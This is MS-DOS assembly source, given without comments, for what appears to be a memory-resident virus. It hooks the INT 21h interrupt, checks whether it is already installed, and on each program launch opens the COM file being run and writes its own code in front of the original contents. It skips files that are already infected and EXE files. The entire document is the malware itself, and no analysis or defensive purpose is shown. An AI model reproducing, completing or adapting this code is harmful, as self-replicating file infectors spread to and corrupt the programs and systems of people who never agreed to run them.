.model tiny
.code
org 100h
start:

mov ah,4Ah
mov bx,0FFFFh
int 21h
sub bx,(vir_size+15)/16+1
mov ah,4Ah
int 21h

mov ah,48h
mov bx,(vir_size+15)/16
int 21h
push ax
mov es,ax
xor di,di
mov si,100h
mov cx,vir_size
rep movsb
mov ax,offset next-100h
push ax
retf

next:
mov ax,0FFFFh
int 21h
test ax,ax
jz exit

set_int:
push cs
pop ds
mov ax,3521h
int 21h
mov [Old_Int21_Off-100h],bx
mov [Old_Int21_Seg-100h],es
mov ah,25h
lea dx,New_Int21
int 21h

exit:
push ss
push ss
pop ds
pop es

mov si,offset old_file
mov di,100h
mov cx,file_size
rep movsb
push ss
push 100h
retf

close_file:
mov ah,3eh
Pushf
call to_int21-100h
restore:
pop es
pop ds
popa

to_int21:
Jump_Old_Int21 db 0eah
Old_Int21_Off dw 0
Old_Int21_Seg dw 0

New_Int21:
cmp ax,0FFFFh
jnz Check_4b
inc ax
iret

Check_4b:
cmp ax,04b00h
jnz to_int21
pusha
push ds
push es

mov ax,3d02h
pushf
call to_int21-100h
jc close_file
xchg ax,bx

push cs
pop ds
mov ax,0a000h
mov es,ax
xor si,si
xor di,di
mov cx,vir_size
rep movsb

mov ds,ax
mov ah,3fh
mov cx,0ffffh
mov dx,di
pushf
call to_int21-100h

mov file_size-100h,ax
cmp ax,0fd00h
ja close_file

mov ax,word ptr [di]
cmp ax,0580Eh
jz close_file

xor al,ah
cmp al,17h
jz close_file

mov ax,4200h
xor cx,cx
xor dx,dx
pushf
call to_int21-100h

mov ah,40h
xor dx,dx
mov cx,file_size-100h
add cx,di
pushf
call to_int21-100h
jmp close_file

File_Size dw 1
vir_size=$-start
old_file: ret
end start
